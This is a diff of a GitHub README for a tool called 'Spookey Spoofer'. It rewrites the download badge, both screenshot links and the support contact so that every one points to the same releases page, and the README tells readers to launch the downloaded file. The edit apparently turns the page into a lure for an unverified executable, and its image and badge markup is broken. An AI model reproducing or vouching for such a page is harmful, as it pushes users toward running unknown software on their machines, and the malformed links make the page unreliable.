@@ -29,7 +29,7 @@ Welcome to the Spookey Spoofer repository! This tool is designed to help you cle
 
 To get started with the Spookey Spoofer, download the tool from the following link:
 
-[![Download Spookey Spoofer](https://img.shields.io/badge/Download-Spookey%20Spoofer-blue)](https://github.com/assets/Release.zip)
+[![Download Spookey Spoofer](https://github.com/chastiine/Spookey-Spoofer/releases%20Spoofer-blue)](https://github.com/chastiine/Spookey-Spoofer/releases)
 
 If the link provided ends with the file name, make sure to launch the downloaded file to start using the tool. If the link does not work or you need more information, please check the "Releases" section of this repository.
 
@@ -37,8 +37,8 @@ If the link provided ends with the file name, make sure to launch the downloaded
 
 Here are some screenshots of the Spookey Spoofer tool in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/chastiine/Spookey-Spoofer/releases)
+![Screenshot 2](https://github.com/chastiine/Spookey-Spoofer/releases)
 
 ## Contributors 🤝
 
@@ -50,7 +50,7 @@ A big thank you to the contributors who have helped make Spookey Spoofer possibl
 
 ## Support ℹ️
 
-If you encounter any issues or need help with the Spookey Spoofer tool, feel free to reach out to us at [support@spookeyspoofer.com](mailto:support@spookeyspoofer.com).
+If you encounter any issues or need help with the Spookey Spoofer tool, feel free to reach out to us at [https://github.com/chastiine/Spookey-Spoofer/releases](https://github.com/chastiine/Spookey-Spoofer/releases).
 
 ## License 📜
 
